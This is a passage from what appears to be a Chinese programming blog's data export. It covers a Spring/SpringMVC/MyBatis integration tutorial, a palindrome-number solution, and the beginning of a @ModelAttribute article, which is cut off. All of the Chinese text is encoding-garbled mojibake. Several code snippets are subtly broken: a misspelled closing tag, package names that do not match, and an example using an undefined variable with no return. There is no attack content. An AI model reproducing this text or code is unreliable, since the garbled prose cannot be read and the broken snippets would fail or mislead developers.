&lt;version&gt;1.2&lt;/version&gt; &lt;/dependency&gt; &lt;!-- log start --&gt; &lt;dependency&gt; &lt;groupId&gt;log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j&lt;/artifactId&gt; &lt;version&gt;${log4j.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt; &lt;version&gt;${slf4j.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-log4j12&lt;/artifactId&gt; &lt;version&gt;${slf4j.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- log end --&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;version&gt;${mybatis.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring&lt;/artifactId&gt; &lt;version&gt;1.3.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;c3p0&lt;/groupId&gt; &lt;artifactId&gt;c3p0&lt;/artifactId&gt; &lt;version&gt;0.9.1.2&lt;/version&gt; &lt;type&gt;jar&lt;/type&gt; &lt;scope&gt;compile&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;finalName&gt;SSM&lt;/finalName&gt; &lt;pluginManagement&gt;&lt;!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) --&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;artifactId&gt;maven-clean-plugin&lt;/artifactId&gt; &lt;version&gt;3.1.0&lt;/version&gt; &lt;/plugin&gt; &lt;!-- see http://maven.apache.org/ref/current/maven-core/default-bindings.html#Plugin_bindings_for_war_packaging --&gt; &lt;plugin&gt; &lt;artifactId&gt;maven-resources-plugin&lt;/artifactId&gt; &lt;version&gt;3.0.2&lt;/version&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;version&gt;3.8.0&lt;/version&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt; &lt;version&gt;2.22.1&lt;/version&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;artifactId&gt;maven-war-plugin&lt;/artifactId&gt; &lt;version&gt;3.2.2&lt;/version&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;artifactId&gt;maven-install-plugin&lt;/artifactId&gt; &lt;version&gt;2.5.2&lt;/version&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;artifactId&gt;maven-deploy-plugin&lt;/artifactId&gt; &lt;version&gt;2.8.2&lt;/version&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/pluginManagement&gt; &lt;/build&gt; &lt;/project&gt; ç¼–å†™å®ä½“ç±»package com.kayleh.domain; import java.io.Serializable; /** * @Author: Wizard * @Date: 2020/4/21 9:06 * * è´¦æˆ· */ public class Account implements Serializable { private Integer id; private String name; private Double money; public Integer getId() { return id; } ......... public void setMoney(Double money) { this.money = money; } } daoæ¥å£package com.kayleh.dao; import com.kayleh.domain.Account; import java.util.List; /** * @Author: Wizard * @Date: 2020/4/21 9:11 * &lt;p&gt; * è´¦æˆ·daoæ¥å£ */ public interface AccountDao { //æŸ¥è¯¢æ‰€æœ‰è´¦æˆ· public List&lt;Account&gt; findAll(); //ä¿å­˜è´¦æˆ·ä¿¡æ¯ public void saveAccount(Account account); } ä¸šåŠ¡serviceå±‚å’Œå®ç°package com.kayleh.service; import com.kayleh.domain.Account; import java.util.List; /** * @Author: Wizard * @Date: 2020/4/21 9:16 */ public interface AccountService { //æŸ¥è¯¢æ‰€æœ‰è´¦æˆ· public List&lt;Account&gt; findAll(); //ä¿å­˜è´¦æˆ·ä¿¡æ¯ public void saveAccount(Account account); } ----------------------------------------------------- package com.kayleh.service.impl; import com.kayleh.domain.Account; import com.kayleh.service.AccountService; import org.springframework.stereotype.Service; import java.util.List; /** * @Author: Wizard * @Date: 2020/4/21 9:18 */ @Service(&quot;accountService&quot;) public class AccountServiceImpl implements AccountService { public List&lt;Account&gt; findAll() { System.out.println(&quot;ä¸šåŠ¡å±‚:æŸ¥è¯¢æ‰€æœ‰è´¦æˆ·...&quot;); return null; } public void saveAccount(Account account) { System.out.println(&quot;ä¸šåŠ¡å±‚:ä¿å­˜è´¦æˆ·...&quot;); } } Springæ•´åˆåœ¨resourceä¸‹åˆ›å»ºSpringé…ç½®æ–‡ä»¶ å‘½åç©ºé—´ xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot; xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd&quot;&gt; æ³¨è§£æ‰«æ&lt;!-- å¼€å¯æ³¨è§£çš„æ‰«æ,å¸Œæœ›å¤„ç†serviceå’Œdao,controllerä¸éœ€è¦Springæ¡†æ¶å»å¤„ç†,controlleræ³¨è§£ç”±SpringMVCå¤„ç† --&gt; &lt;context:component-scan base-package=&quot;com.kayleh&quot;&gt; &lt;!-- é…ç½®å“ªäº›æ³¨è§£ä¸æ‰«æ --&gt; &lt;context:exclude-filter type=&quot;annotation&quot; expression=&quot;org.springframework.stereotype.Controller&quot;/&gt; &lt;/context:component-scan&gt; æµ‹è¯•package com.kayleh.test; import com.kayleh.service.AccountService; import org.junit.Test; import org.springframework.context.ApplicationContext; import org.springframework.context.support.ClassPathXmlApplicationContext; /** * @Author: Wizard * @Date: 2020/4/21 9:38 */ public class TestSpring { @Test public void run1(){ //åŠ è½½é…ç½®æ–‡ä»¶ ApplicationContext ac = new ClassPathXmlApplicationContext(&quot;classpath:applicationContext.xml&quot;); //è·å–å¯¹è±¡ AccountService as = (AccountService) ac.getBean(&quot;accountService&quot;); //è°ƒç”¨æ–¹æ³• as.findAll(); } } è¿è¡Œæµ‹è¯•,æˆåŠŸè°ƒç”¨accountService æ­å»ºå’Œæµ‹è¯•SpringMVCçš„å¼€å‘ç¯å¢ƒ1.åœ¨web.xmlä¸­é…ç½®DispatcherServletå‰ç«¯æ§åˆ¶å™¨ &lt;!-- é…ç½®å‰ç«¯æ§åˆ¶å™¨ï¼šæœåŠ¡å™¨å¯åŠ¨å¿…é¡»åŠ è½½,éœ€è¦åŠ è½½springmvc.xmlé…ç½®æ–‡ä»¶ --&gt; &lt;servlet&gt; &lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;!-- é…ç½®åˆå§‹åŒ–å‚æ•°,åˆ›å»ºå®ŒDispatcherServletå¯¹è±¡,åŠ è½½springmvc.xmlé…ç½®æ–‡ä»¶ --&gt; &lt;init-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath:springmvc.xml&lt;/param-value&gt; &lt;/init-param&gt; &lt;!-- æœåŠ¡å™¨å¯åŠ¨çš„æ—¶å€™,è®©DispatcherServletå¯¹è±¡åˆ›å»º --&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; 2.åœ¨web.xmlä¸­é…ç½®DispatcherServletè¿‡æ»¤å™¨è§£å†³ä¸­æ–‡ä¹±ç  &lt;!-- é…ç½®è§£å†³ä¸­æ–‡ä¹±ç çš„è¿‡æ»¤å™¨ --&gt; &lt;filter&gt; &lt;filter-name&gt;characterEncodingFilter&lt;/filter-name&gt; &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt; &lt;init-param&gt; &lt;param-name&gt;encoding&lt;/param-name&gt; &lt;param-value&gt;UTF-8&lt;/param-value&gt; &lt;/init-param&gt; &lt;/filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;characterEncodingFilter&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt; &lt;/filter-mapping&gt; 3.åˆ›å»ºspringmvc.xmlçš„é…ç½®æ–‡ä»¶,ç¼–å†™é…ç½®æ–‡ä»¶ &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:mvc=&quot;http://www.springframework.org/schema/mvc&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot; http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd&quot;&gt; &lt;!-- å¼€å¯æ³¨è§£æ‰«æ --&gt; &lt;context:component-scan base-package=&quot;com.kayleh&quot;&gt; &lt;context:include-filter type=&quot;annotation&quot; expression=&quot;org.springframework.stereotype.Controller&quot;/&gt; &lt;/context:component-scan&gt; &lt;!--é…ç½®çš„è§†å›¾è§£æå™¨å¯¹è±¡--&gt; &lt;bean id=&quot;internalResourceViewResolver&quot; class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt; &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/pages/&quot;/&gt; &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot;/&gt; &lt;/bean&gt; &lt;!--è¿‡æ»¤é™æ€èµ„æº--&gt; &lt;mvc:resources mapping=&quot;/CSS/**&quot; location=&quot;/CSS/&quot;/&gt; &lt;mvc:resources mapping=&quot;/images/**&quot; location=&quot;/images/&quot;/&gt; &lt;mvc:resources mapping=&quot;/js/**&quot; location=&quot;/js/&quot;/&gt; &lt;!--å¼€å¯SpringMVCçš„æ³¨è§£æ”¯æŒ--&gt; &lt;mvc:annotation-driven/&gt; &lt;/beans&gt; æµ‹è¯•SpringMVCçš„æ¡†æ¶æ­å»ºæ˜¯å¦æˆåŠŸ1.ç¼–å†™index.jspå’Œlist.jspç¼–å†™,è¶…é“¾æ¥ è‡ªå¸¦çš„index.jspæ²¡æœ‰å¤´éƒ¨ä¿¡æ¯ï¼Œéœ€è¦é‡æ–°åˆ›å»º &lt;a href=&quot;account/findAll&quot;&gt;æŸ¥è¯¢æ‰€æœ‰&lt;/a&gt; 2.åˆ›å»ºAccountControllerç±»,ç¼–å†™æ–¹æ³•,è¿›è¡Œæµ‹è¯• package cn.kayleh.controller; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; @Controller @RequestMapping(&quot;/account&quot;) public class AccountController { /** * æŸ¥è¯¢æ‰€æœ‰çš„æ•°æ® * @return */ @RequestMapping(&quot;/findAll&quot;) public String findAll() { System.out.println(&quot;è¡¨ç°å±‚ï¼šæŸ¥è¯¢æ‰€æœ‰è´¦æˆ·...&quot;); return &quot;list&quot;; } } Springæ•´åˆSpringMVCçš„æ¡†æ¶ ç›®çš„ï¼šåœ¨controllerä¸­èƒ½æˆåŠŸçš„è°ƒç”¨serviceå¯¹è±¡ä¸­çš„æ–¹æ³•. åœ¨é¡¹ç›®å¯åŠ¨çš„æ—¶å€™,å°±å»åŠ è½½applicationContext.xmlçš„é…ç½®æ–‡ä»¶,åœ¨web.xmlä¸­é…ç½®ContextLoaderListenerç›‘å¬å™¨ï¼ˆè¯¥ç›‘å¬å™¨åªèƒ½åŠ è½½WEB-INFç›®å½•ä¸‹çš„applicationContext.xmlçš„é…ç½®æ–‡ä»¶ï¼‰ã€‚&lt;!-- é…ç½®Springçš„ç›‘å¬å™¨ --&gt; &lt;listener&gt; &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listenerclass&gt; &lt;/listener&gt; &lt;!-- é…ç½®åŠ è½½ç±»è·¯å¾„çš„é…ç½®æ–‡ä»¶ --&gt; &lt;context-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath:applicationContext.xml&lt;/param-value&gt; &lt;/context-param&gt; åœ¨controllerä¸­æ³¨å…¥serviceå¯¹è±¡,è°ƒç”¨serviceå¯¹è±¡çš„æ–¹æ³•è¿›è¡Œæµ‹è¯•```javapackage cn.itcast.controller;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import cn.kayleh.service.AccountService;@Controller@RequestMapping(â€œ/accountâ€)public class AccountController { @Autowired private AccountService accoutService; /** æŸ¥è¯¢æ‰€æœ‰çš„æ•°æ® @return*/@RequestMapping(â€œ/findAllâ€)public String findAll() {System.out.println(â€œè¡¨ç°å±‚ï¼šæŸ¥è¯¢æ‰€æœ‰è´¦æˆ·â€¦â€);accoutService.findAll();return â€œlistâ€; }}``` Springæ•´åˆMyBatisæ¡†æ¶æ­å»ºå’Œæµ‹è¯•MyBatisçš„ç¯å¢ƒåœ¨webé¡¹ç›®ä¸­ç¼–å†™SqlMapConfig.xmlçš„é…ç½®æ–‡ä»¶ï¼Œç¼–å†™æ ¸å¿ƒé…ç½®æ–‡ä»¶,åœ¨åé¢æ•´åˆè¿›applicationContext.xmlåå¯ä»¥åˆ é™¤&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE configuration PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;&gt; &lt;configuration&gt; &lt;environments default=&quot;mysql&quot;&gt; &lt;environment id=&quot;mysql&quot;&gt; &lt;transactionManager type=&quot;JDBC&quot;/&gt; &lt;dataSource type=&quot;POOLED&quot;&gt; &lt;property name=&quot;driver&quot; value=&quot;com.mysql.jdbc.Driver&quot;/&gt; &lt;property name=&quot;url&quot; value=&quot;jdbc:mysql:///ssm&quot;/&gt; &lt;property name=&quot;username&quot; value=&quot;root&quot;/&gt; &lt;property name=&quot;password&quot; value=&quot;admin&quot;/&gt; &lt;/dataSource&gt; &lt;/environment&gt; &lt;/environments&gt; &lt;!-- ä½¿ç”¨çš„æ˜¯æ³¨è§£ --&gt; &lt;mappers&gt; &lt;!-- &lt;mapper class=&quot;cn.kayleh.dao.AccountDao&quot;/&gt; --&gt; &lt;!-- è¯¥åŒ…ä¸‹æ‰€æœ‰çš„daoæ¥å£éƒ½å¯ä»¥ä½¿ç”¨ --&gt; &lt;package name=&quot;cn.kayleh.dao&quot;/&gt; &lt;/mappers&gt; &lt;/configuration&gt; åœ¨AccountDaoæ¥å£çš„æ–¹æ³•ä¸Šæ·»åŠ æ³¨è§£ï¼Œç¼–å†™SQLè¯­å¥package com.kayleh.dao; import com.kayleh.domain.Account; import org.apache.ibatis.annotations.Insert; import org.apache.ibatis.annotations.Select; import org.springframework.stereotype.Repository; import java.util.List; /** * @Author: Wizard * @Date: 2020/4/21 9:11 * &lt;p&gt; * è´¦æˆ·daoæ¥å£ */ @Repository public interface AccountDao { //æŸ¥è¯¢æ‰€æœ‰è´¦æˆ· @Select(&quot;select * from account&quot;) public List&lt;Account&gt; findAll(); //ä¿å­˜è´¦æˆ·ä¿¡æ¯ @Insert(&quot;insert into account(name,money) values (#{name},#{money})&quot;) public void saveAccount(Account account); } ç¼–å†™æµ‹è¯•çš„æ–¹æ³•package com.kayleh.test; import com.kayleh.service.AccountService; import org.junit.Test; import org.springframework.context.ApplicationContext; import org.springframework.context.support.ClassPathXmlApplicationContext; /** * @Author: Wizard * @Date: 2020/4/21 9:38 */ public class TestSpring { @Test public void run1(){ //åŠ è½½é…ç½®æ–‡ä»¶ ApplicationContext ac = new ClassPathXmlApplicationContext(&quot;classpath:applicationContext.xml&quot;); //è·å–å¯¹è±¡ AccountService as = (AccountService) ac.getBean(&quot;accountService&quot;); //è°ƒç”¨æ–¹æ³• as.findAll(); } } Springæ•´åˆMyBatisæ¡†æ¶ç›®çš„ï¼šæŠŠSqlMapConfig.xmlé…ç½®æ–‡ä»¶ä¸­çš„å†…å®¹é…ç½®åˆ°applicationContext.xmlé…ç½®æ–‡ä»¶ä¸­ &lt;!--Srpingæ•´åˆMyBatisæ¡†æ¶--&gt; &lt;!--é…ç½®è¿æ¥æ± --&gt; &lt;!--å¼•å…¥å¤–éƒ¨é…ç½®æ–‡ä»¶--&gt; &lt;!-- &lt;context:property-placeholder location=&quot;classpath:jdbc.properties&quot;/&gt;--&gt; &lt;bean id=&quot;ds&quot; class=&quot;com.mchange.v2.c3p0.ComboPooledDataSource&quot;&gt; &lt;property name=&quot;driverClass&quot; value=&quot;com.mysql.jdbc.Driver&quot;/&gt; &lt;property name=&quot;jdbcUrl&quot; value=&quot;jdbc:mysql:///ssm&quot;/&gt;&lt;!--çœç•¥äº†localhost:3306--&gt; &lt;property name=&quot;user&quot; value=&quot;root&quot;/&gt; &lt;property name=&quot;password&quot; value=&quot;admin&quot;/&gt; &lt;/bean&gt; &lt;!--é…ç½®SqlSessionFactoryå·¥å‚--&gt; &lt;bean id=&quot;sqlSessionFactory&quot; class=&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;&gt; &lt;property name=&quot;dataSource&quot; ref=&quot;ds&quot;/&gt; &lt;/bean&gt; &lt;!--é…ç½®AccountDaoæ¥å£æ‰€åœ¨åŒ…--&gt; &lt;bean id=&quot;mapperScannerConfigurer&quot; class=&quot;org.mybatis.spring.mapper.MapperScannerConfigurer&quot;&gt; &lt;property name=&quot;basePackage&quot; value=&quot;com.kayleh.dao&quot; /&gt; &lt;/bean&gt; åœ¨AccountDaoæ¥å£ä¸­æ·»åŠ @Repositoryæ³¨è§£åœ¨serviceä¸­æ³¨å…¥daoå¯¹è±¡ï¼Œè¿›è¡Œæµ‹è¯•package com.kayleh.dao; import com.kayleh.domain.Account; import org.apache.ibatis.annotations.Insert; import org.apache.ibatis.annotations.Select; import org.springframework.stereotype.Repository; import java.util.List; /** * @Author: Wizard * @Date: 2020/4/21 9:11 * &lt;p&gt; * è´¦æˆ·daoæ¥å£ */ @Repository public interface AccountDao { //æŸ¥è¯¢æ‰€æœ‰è´¦æˆ· @Select(&quot;select * from account&quot;) public List&lt;Account&gt; findAll(); //ä¿å­˜è´¦æˆ·ä¿¡æ¯ @Insert(&quot;insert into account(name,money) values (#{name},#{money})&quot;) public void saveAccount(Account account); } ------------------------------------------------------------- package com.kayleh.service.impl; import com.kayleh.dao.AccountDao; import com.kayleh.domain.Account; import com.kayleh.service.AccountService; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.stereotype.Service; import java.util.List; /** * @Author: Wizard * @Date: 2020/4/21 9:18 */ @Service(&quot;accountService&quot;) public class AccountServiceImpl implements AccountService { @Autowired private AccountDao accountDao; public List&lt;Account&gt; findAll() { System.out.println(&quot;ä¸šåŠ¡å±‚:æŸ¥è¯¢æ‰€æœ‰è´¦æˆ·...&quot;); return accountDao.findAll(); } public void saveAccount(Account account) { System.out.println(&quot;ä¸šåŠ¡å±‚:ä¿å­˜è´¦æˆ·...&quot;); accountDao.saveAccount(account); } } ------------------------------------------------------------- package com.kayleh.controller; import com.kayleh.domain.Account; import com.kayleh.service.AccountService; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.stereotype.Controller; import org.springframework.ui.Model; import org.springframework.web.bind.annotation.RequestMapping; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.xml.ws.RequestWrapper; import java.io.IOException; import java.util.List; /** * @Author: Wizard * @Date: 2020/4/21 9:21 * &lt;p&gt; * ç”¨æˆ·webå±‚ */ @Controller @RequestMapping(&quot;/account&quot;) public class AccountController { @Autowired private AccountService accountService; @RequestMapping(&quot;/findAll&quot;) public String findAll(Model model) { System.out.println(&quot;è¡¨ç°å±‚:æŸ¥è¯¢æ‰€æœ‰çš„è´¦æˆ·...&quot;); List&lt;Account&gt; list = accountService.findAll(); model.addAttribute(&quot;list&quot;, list); return &quot;list&quot;; } é…ç½®Springçš„å£°æ˜å¼äº‹åŠ¡ç®¡ç†applicationContext.xml &lt;!-- é…ç½®Springæ¡†æ¶å£°æ˜å¼äº‹åŠ¡ç®¡ç† --&gt; &lt;!-- é…ç½®äº‹åŠ¡ç®¡ç†å™¨ --&gt; &lt;bean id=&quot;transactionManager&quot; class=&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;&gt; &lt;property name=&quot;dataSource&quot; ref=&quot;ds&quot;/&gt; &lt;/bean&gt; &lt;!-- é…ç½®äº‹åŠ¡é€šçŸ¥ --&gt; &lt;tx:advice id=&quot;txAdvice&quot; transaction-manager=&quot;transactionManager&quot;&gt; &lt;tx:attributes&gt; &lt;tx:method name=&quot;find*&quot; read-only=&quot;true&quot;/&gt; &lt;tx:method name=&quot;*&quot; isolation=&quot;DEFAULT&quot;/&gt; &lt;/tx:attributes&gt; &lt;/tx:advice&gt; &lt;!-- é…ç½®AOPå¢å¼º --&gt; &lt;aop:config&gt; &lt;aop:advisor advice-ref=&quot;txAdvice&quot; pointcut=&quot;execution(* com.kayleh.service.impl.*ServiceImpl.*(..))&quot;/&gt; &lt;/aop:config&gt; /** * ä¿å­˜ * * @param account * @return */ @RequestMapping(&quot;/save&quot;) public void save(Account account, HttpServletRequest request, HttpServletResponse response) throws Exception { System.out.println(&quot;è¡¨ç°å±‚:æŸ¥è¯¢æ‰€æœ‰çš„è´¦æˆ·...&quot;); accountService.saveAccount(account); response.sendRedirect(request.getContextPath() + &quot;/account/findAll&quot;); return; }","categories":[],"tags":[{"name":"frame","slug":"frame","permalink":"https://blog.kayleh.top/tags/frame/"}]},{"title":"palindrome","slug":"å›æ–‡æ•°","date":"2020-04-19T05:17:57.000Z","updated":"2021-04-11T17:11:28.808Z","comments":true,"path":"å›æ–‡æ•°/","link":"","permalink":"https://blog.kayleh.top/%E5%9B%9E%E6%96%87%E6%95%B0/","excerpt":"ä»€ä¹ˆæ˜¯å›æ–‡æ•°ï¼Ÿå›æ–‡æ•°æŒ‡çš„æ˜¯æ­£åºå’Œå€’åºè¯»éƒ½æ˜¯ä¸€æ ·çš„æ•°ï¼Œä¾‹å¦‚121ä»å·¦åˆ°å³ï¼Œä»å³åˆ°å·¦è¯»éƒ½æ˜¯121ã€‚ä»»ä½•ä¸€ä¸ªè‡ªç„¶æ•°ä¸å®ƒçš„å€’åºæ•°ç›¸åŠ ï¼Œæ‰€å¾—çš„å’Œå†ä¸å’Œçš„å€’åºæ•°ç›¸åŠ ï¼Œâ€¦â€¦å¦‚æ­¤åå¤è¿›è¡Œä¸‹å»ï¼Œç»è¿‡æœ‰é™æ¬¡æ­¥éª¤åï¼Œæœ€åå¿…å®šèƒ½å¾—åˆ°ä¸€ä¸ªå›æ–‡æ•°ã€‚","text":"ä»€ä¹ˆæ˜¯å›æ–‡æ•°ï¼Ÿå›æ–‡æ•°æŒ‡çš„æ˜¯æ­£åºå’Œå€’åºè¯»éƒ½æ˜¯ä¸€æ ·çš„æ•°ï¼Œä¾‹å¦‚121ä»å·¦åˆ°å³ï¼Œä»å³åˆ°å·¦è¯»éƒ½æ˜¯121ã€‚ä»»ä½•ä¸€ä¸ªè‡ªç„¶æ•°ä¸å®ƒçš„å€’åºæ•°ç›¸åŠ ï¼Œæ‰€å¾—çš„å’Œå†ä¸å’Œçš„å€’åºæ•°ç›¸åŠ ï¼Œâ€¦â€¦å¦‚æ­¤åå¤è¿›è¡Œä¸‹å»ï¼Œç»è¿‡æœ‰é™æ¬¡æ­¥éª¤åï¼Œæœ€åå¿…å®šèƒ½å¾—åˆ°ä¸€ä¸ªå›æ–‡æ•°ã€‚ é—®é¢˜ï¼šåˆ¤æ–­ä¸€ä¸ªæ•°æ˜¯å¦ä¸ºå›æ–‡æ•°ï¼Œæ˜¯è¿”å›trueï¼Œå¦ä¾§æŠ›å‡ºfalseã€‚ @é¢˜ç›®æ¥æºlettcode åˆ©ç”¨Javaçš„StringBuilderé€šè¿‡æŠŠæ•´æ•°è½¬æ¢ä¸ºå­—ç¬¦ä¸²æ¥å®ç°â†“ import java.util.Scanner; /** * @Author: Wizard * @Date: 2020/4/12 13:14 */ public class palindrome { public static boolean ispalindrome(int i) { String str = (new StringBuilder(i + &quot;&quot;)).reverse().toString(); return (i + &quot;&quot;).equals(str); } public static void main(String[] args) { while (true) { System.out.println(&quot;è¾“å…¥éœ€è¦åˆ¤æ–­çš„æ•´æ•°&quot;); Scanner scanner = new Scanner(System.in); int str1 = scanner.nextInt(); System.out.println(ispalindrome(str1)); } } } /** * è¾“å…¥éœ€è¦åˆ¤æ–­çš„æ•´æ•°ï¼š1 * false * è¾“å…¥éœ€è¦åˆ¤æ–­çš„æ•´æ•°ï¼š12121 * true */ è¿›é˜¶ï¼šä¸æ”¹å˜æ•´æ•°ä¸ºå­—ç¬¦ä¸² é€šè¿‡å–æ•´å’Œå–ä½™è·å–æ•´æ•°ä¸­çš„æ•°å­—è¿›è¡Œæ¯”è¾ƒ /** * @Author: Wizard * @Date: 2020/4/12 13:14 */ public class palindrome { public static boolean ispalindrome(int i) { if(i&lt;0||(i%10==0&amp;&amp;i!=0)) return false; int number = 0; while(i&gt;number){ number = number * 10 + i % 10; i /=10; } return i == number || i==number/10; } public static void main(String[] args) { while (true) { System.out.println(&quot;è¾“å…¥éœ€è¦åˆ¤æ–­çš„æ•´æ•°&quot;); Scanner scanner = new Scanner(System.in); int str1 = scanner.nextInt(); System.out.println(ispalindrome(str1)); } } } å¾®ä¿¡å…¬ä¼—å·:æ¯æ—¥å­¦ä¹ å¹²è´§â†“&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://blog.kayleh.top/tags/algorithm/"}]},{"title":"SpringMVC@ModelAttributeçš„ä½¿ç”¨","slug":"ã€SpringMVCã€‘-@ModelAttribute","date":"2020-04-19T05:04:07.000Z","updated":"2021-04-11T17:11:28.546Z","comments":true,"path":"ã€SpringMVCã€‘-@ModelAttribute/","link":"","permalink":"https://blog.kayleh.top/%E3%80%90SpringMVC%E3%80%91-@ModelAttribute/","excerpt":"@ModelAttributeï¼Ÿ","text":"@ModelAttributeï¼Ÿ @ModelAttributeçš„åŸç†æ¯”è¾ƒå¤æ‚ï¼Œéœ€è¦å¯¹æºç æœ‰ä¸€å®šçš„ç†è§£ã€‚å®ƒå¯ä»¥ä½¿è¢« @ModelAttributeä¿®é¥°çš„æ–¹æ³•åœ¨æ§åˆ¶å™¨çš„å¤„ç†æ–¹æ³•ä¹‹å‰è°ƒç”¨ã€‚ä½†å¦‚æœ@ModelAttributeæ ‡æ³¨åœ¨æ–¹æ³•çš„å…¥å‚å‰ï¼Œå®ƒå¯ä»¥ä»éšå«å¯¹è±¡ä¸­è·å–éšå«çš„æ¨¡å‹æ•°æ®ä¸­è·å–å¯¹è±¡ï¼Œå†å°†è¯·æ±‚å‚æ•°ç»‘å®šåˆ°å¯¹è±¡ä¸­ï¼Œå†ä¼ å…¥å…¥å‚ã€‚ å®é™…åœºæ™¯ï¼šSpringåœ¨è¿›è¡Œæ•°æ®åº“updateå…¨å­—æ®µæ›´æ–°æ“ä½œæäº¤è¡¨å•çš„æ—¶å€™ï¼Œä»é¡µé¢è·å–çš„æ•°æ®ä¼šå°è£…æˆä¸€ä¸ªnewçš„pojoå¯¹è±¡ï¼Œæ²¡æœ‰å¸¦çš„å€¼ä¸ºnullï¼›æ‰€ä»¥æˆ‘ä»¬åªèƒ½æ›´æ–°æˆ‘ä»¬æäº¤çš„æ•°æ®ã€‚ModelAttributeæš‚æ—¶ä¿å­˜è¡¨å•pojoå¯¹è±¡ï¼Œè¦†ç›–æ•°æ®åº“ä¿å­˜çš„pojoå¯¹è±¡çš„æ•°æ®å³å¯ã€‚ ModelAttributeæå‰ä¸ç›®æ ‡æ–¹æ³•è¿è¡Œ /** * @author Kayleh */ @Controller public class ModelAttributeTest { @RequestMapping(&quot;/update&quot;) public String update(){ System.out.println(&quot;é¡µé¢updateçš„beanå¯¹è±¡ï¼š&quot;+bean); } @ModelAttribute public void modelAttribute(){ System.out.println(&quot;ModelAttributeè°ƒç”¨äº†...&quot;); } ===========è¾“å‡º========= ModelAttributeè°ƒç”¨äº†... é¡µé¢updateçš„beanå¯¹è±¡ï¼šbean{......} å¯ä»¥å¾—å‡ºï¼šModelAttributeæ ‡æ³¨çš„æ–¹æ³•æ€»ä¼šåœ¨ç›®æ 